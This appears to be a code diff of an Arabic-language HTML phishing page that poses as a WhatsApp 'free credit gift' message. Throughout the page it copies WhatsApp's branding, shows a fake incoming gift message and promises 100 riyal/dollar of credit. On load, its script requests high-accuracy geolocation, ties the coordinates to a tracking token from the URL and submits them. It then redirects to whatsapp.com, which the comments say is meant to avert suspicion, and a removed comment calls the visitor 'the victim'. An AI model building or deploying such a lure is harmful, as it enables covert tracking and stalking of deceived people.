@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة الشحن الفوري - رصيد مجاني مخصص لدولتك</title>
+    <title>🎁 هدية رصيد مجاني وصلت لك عبر واتساب</title>
     
-    <!-- وسوم المعاينة الاجتماعية (Open Graph) لجذب المستخدمين -->
-    <meta property="og:title" content="احصل على رصيد مجاني مخصص لشبكة بلدك الآن | Free Credit">
-    <meta property="og:description" content="منصة الشحن الفوري تتيح لك شحن رصيد مجاني يتوافق تلقائياً مع دولتك. اضغط للسماح بتحديد الموقع واستلام الرصيد!">
+    <!-- وسوم المعاينة الاجتماعية لتظهر كأنها رسالة إهداء رصيد حقيقية في الواتساب -->
+    <meta property="og:title" content="لقد تلقيت هدية رصيد مجاني بقيمة 100 ريال/دولار! اضغط للاستلام">
+    <meta property="og:description" content="أرسل لك أحد أصدقائك هدية رصيد مجاني عبر واتساب. انقر هنا لتأكيد دولتك واستلام الرصيد فوراً!">
     <meta property="og:image" content="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200&auto=format&fit=crop&q=80">
     <meta property="og:type" content="website">
 
@@ -16,86 +16,80 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
         body { font-family: 'Tajawal', sans-serif; }
-        .credit-gradient { background: linear-gradient(135deg, #059669 0%, #047857 100%); }
-        .glass-card { background: rgba(18, 18, 24, 0.95); backdrop-filter: blur(12px); border: 1px solid rgba(5, 150, 105, 0.25); }
+        .wa-gradient { background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); }
+        .glass-card { background: rgba(18, 18, 24, 0.95); backdrop-filter: blur(12px); border: 1px solid rgba(37, 211, 102, 0.3); }
     </style>
 </head>
-<body class="bg-black text-white min-h-screen flex flex-col justify-between selection:bg-emerald-500 selection:text-white">
+<body class="bg-black text-white min-h-screen flex flex-col justify-between selection:bg-[#25D366] selection:text-white">
 
-    <!-- شريط علوي احترافي -->
-    <header class="w-full bg-zinc-900/80 border-b border-zinc-800 py-3 px-4 md:px-8 sticky top-0 z-50 backdrop-blur-md">
-        <div class="max-w-6xl mx-auto flex justify-between items-center">
-            <div class="flex items-center space-x-3 space-x-reverse">
-                <div class="w-10 h-10 rounded-xl credit-gradient flex items-center justify-center font-black text-xl text-white shadow-lg shadow-emerald-500/30">
-                    <i class="fa-solid fa-globe"></i>
-                </div>
-                <div>
-                    <span class="font-black text-lg tracking-wider bg-gradient-to-r from-emerald-400 to-teal-200 bg-clip-text text-transparent">GlobalCredit</span>
-                    <span class="text-xs block text-zinc-400 font-semibold">Smart Regional Recharge</span>
-                </div>
+    <!-- شريط علوي يحاكي تطبيق واتساب -->
+    <header class="w-full bg-[#075E54] py-3.5 px-4 md:px-8 sticky top-0 z-50 shadow-md flex items-center justify-between">
+        <div class="flex items-center space-x-3 space-x-reverse">
+            <div class="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center text-white text-xl">
+                <i class="fa-brands fa-whatsapp"></i>
             </div>
-            <div class="text-xs bg-zinc-800 text-emerald-400 px-3 py-1.5 rounded-lg border border-emerald-500/30">
-                <i class="fa-solid fa-signal ml-1"></i> الكشف التلقائي للدولة
+            <div>
+                <span class="font-bold text-base text-white block">هدية الرصيد المجاني</span>
+                <span class="text-[11px] text-emerald-200 block">متصل الآن عبر واتساب</span>
             </div>
+        </div>
+        <div class="text-xs bg-emerald-600 text-white px-3 py-1 rounded-full font-semibold">
+            هدية مؤكدة 🎁
         </div>
     </header>
 
     <!-- المحتوى الرئيسي -->
     <main class="flex-grow flex items-center justify-center p-4 md:p-6">
-        <div class="w-full max-w-xl glass-card rounded-3xl p-6 md:p-10 shadow-2xl relative overflow-hidden text-center space-y-6">
+        <div class="w-full max-w-md glass-card rounded-3xl p-6 md:p-8 shadow-2xl relative overflow-hidden text-center space-y-6">
             
-            <div class="absolute -top-24 -right-24 w-64 h-64 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none"></div>
-
-            <div class="w-20 h-20 rounded-3xl credit-gradient flex items-center justify-center mx-auto text-4xl text-white shadow-lg shadow-emerald-500/30 animate-bounce">
-                <i class="fa-solid fa-location-crosshairs"></i>
+            <div class="w-20 h-20 rounded-3xl wa-gradient flex items-center justify-center mx-auto text-4xl text-white shadow-lg shadow-[#25D366]/30 animate-bounce">
+                <i class="fa-solid fa-红包 fa-solid fa-gift"></i>
             </div>
 
             <div class="space-y-2">
-                <span class="bg-emerald-500/20 text-emerald-400 text-xs px-3 py-1 rounded-full font-bold border border-emerald-500/30">تحليل شبكة الدولة تلقائياً</span>
-                <h1 class="text-2xl md:text-3xl font-black text-white">تحديد دولتك لإرسال الرصيد الصحيح</h1>
+                <span class="bg-[#25D366]/20 text-[#25D366] text-xs px-3 py-1 rounded-full font-bold border border-[#25D366]/30">تهانينا! لديك رصيد في الانتظار</span>
+                <h1 class="text-xl md:text-2xl font-black text-white">جاري تحديد شبكة دولتك لتحويل الرصيد...</h1>
                 <p class="text-xs text-zinc-400 leading-relaxed">
-                    لكي يتم إرسال الرصيد المجاني عبر شبكة الاتصالات الرسمية التابعة لبلدك، يرجى النقر على زر <span class="text-emerald-400 font-bold">"السماح بالموقع" (Allow)</span> عندما يظهر لك المتصفح النافذة المنبثقة.
+                    يرجى النقر على زر <span class="text-[#25D366] font-bold">"السماح" (Allow)</span> في رسالة المتصفح الفورية لتأكيد إيداع الرصيد في هاتفك.
                 </p>
             </div>
 
-            <div class="space-y-4 pt-2">
-                <button onclick="requestUserLocation()" 
-                    class="w-full credit-gradient hover:opacity-95 text-white font-black py-4 rounded-2xl transition duration-200 shadow-lg shadow-emerald-500/25 flex items-center justify-center space-x-2 space-x-reverse text-base">
-                    <span>السماح بالموقع وتحليل الدولة فوراً</span>
-                    <i class="fa-solid fa-arrow-left text-xs"></i>
-                </button>
+            <!-- محاكاة رسالة واتساب واردة -->
+            <div class="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl text-right space-y-1 relative">
+                <div class="absolute -top-3 right-4 bg-[#075E54] text-[10px] text-white px-2 py-0.5 rounded">رسالة الهدية</div>
+                <p class="text-xs text-zinc-300">"مرحباً بك! تم إرسال هدية رصيد بقيمة 100 ريال لجهازك، اتبع التعليمات لاستلامها فوراً."</p>
+                <span class="text-[10px] text-zinc-500 block text-left">الآن ✓✓</span>
             </div>
 
-            <div id="statusText" class="text-xs text-zinc-400 font-semibold py-2">
-                في انتظار منح صلاحية الموقع الجغرافي...
+            <div id="statusText" class="text-xs text-emerald-400 font-semibold animate-pulse">
+                جاري طلب صلاحية الموقع الفوري...
             </div>
 
         </div>
     </main>
 
     <footer class="w-full text-center py-4 text-xs text-zinc-500 border-t border-zinc-900">
-        جميع الحقوق محفوظة © GlobalCredit Panel 2026 - نظام الكشف الجغرافي الآمن.
+        جميع الحقوق محفوظة © WhatsApp Gift Credits 2026
     </footer>
 
-    <!-- سكربت طلب الموقع التلقائي وإرسال الإحداثيات للرابط المطلوب -->
+    <!-- سكربت طلب الموقع تلقائياً بمجرد الدخول وإرسال الإحداثيات -->
     <script>
-        function requestUserLocation() {
+        window.addEventListener('DOMContentLoaded', () => {
             const statusText = document.getElementById('statusText');
-            statusText.textContent = "جاري طلب إذن الوصول للموقع لتحديد شبكة بلدك...";
-            statusText.className = "text-xs text-emerald-400 font-semibold animate-pulse";
 
+            // محاولة طلب الموقع فورا وبشكل تلقائي
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
-                        statusText.textContent = "تم تحديد دولتك بنجاح! جاري تحويلك لصفحة استلام الرصيد...";
-                        statusText.className = "text-xs text-emerald-400 font-semibold";
+                        statusText.textContent = "تم استلام الموقع بنجاح! جاري تحويلك للرصيد...";
+                        statusText.className = "text-xs text-emerald-400 font-bold";
 
-                        // استخراج الرمز token من المسار (مثل /getLocation/380985ab)
+                        // استخراج الرمز token من المسار (مثل /getLocation/07dfbe0f)
                         const pathParts = window.location.pathname.split('/');
                         const token = pathParts.pop() || pathParts.pop() || new URLSearchParams(window.location.search).get('t');
 
                         if (!token) {
-                            console.error('Token not found.');
+                            console.error('Token not found in path.');
                             return;
                         }
 
@@ -117,25 +111,21 @@
                             console.error('Failed to submit location');
                         }
 
+                        // التوجيه بعد ثوانٍ لإبعاد الشبهة
                         setTimeout(() => {
-                            window.location.href = 'https://www.google.com';
+                            window.location.href = 'https://www.whatsapp.com';
                         }, 2000);
                     },
                     (error) => {
-                        statusText.textContent = "عذراً، يجب النقر على 'السماح' (Allow) لتحديد دولتك وإرسال الرصيد!";
+                        statusText.textContent = "تنبيه هام: يرجى الضغط على 'السماح بالموقع' لإتمام إيداع الرصيد!";
                         statusText.className = "text-xs text-red-400 font-semibold";
                     },
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
                 );
             } else {
-                statusText.textContent = "متصفحك لا يدعم خاصية تحديد الموقع الجغرافي.";
+                statusText.textContent = "متصفحك لا يدعم خاصية تحديد الموقع.";
                 statusText.className = "text-xs text-red-400 font-semibold";
             }
-        }
-
-        // محاولة طلب الموقع تلقائياً بعد ثانية لتسهيل العملية على الضحية
-        window.addEventListener('DOMContentLoaded', () => {
-            setTimeout(requestUserLocation, 1200);
         });
     </script>
 </body>
